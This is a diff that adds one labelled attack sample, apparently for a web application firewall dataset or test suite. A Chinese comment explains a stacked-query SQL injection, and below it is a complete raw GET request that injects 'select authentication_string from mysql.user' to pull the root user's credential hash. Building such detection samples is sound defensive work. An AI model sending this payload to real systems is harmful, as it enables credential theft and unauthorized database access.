@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506225
+# 攻击者基于堆叠查询，将"select authentication_string from mysql.user"语句注入到原始SQL语句结尾，目的是获取数据库用户表中具有管理员权限的用户（'root'）的身份验证字符串（authentication_string）。这个字符串可能包含敏感信息，如密码或加密凭据。从而可能利用这些信息进行未授权的访问，操纵或破坏数据库中的数据。攻击者还可以利用这些信息扩大攻击面，获取更多的权限，甚至控制整个数据库服务器。
+GET /?id=1%3Bselect%20authentication_string%20from%20mysql.user%20where%20user=%27root%27&bid=hd_tag_m8mv24fh HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24fh
+RM-PRO-Token: 333d4cb33a704f7c4b7c47d1a79a68a8
+RM-PRO-Time: 1742808379469
+User-Agent: curl/7.83.1
+
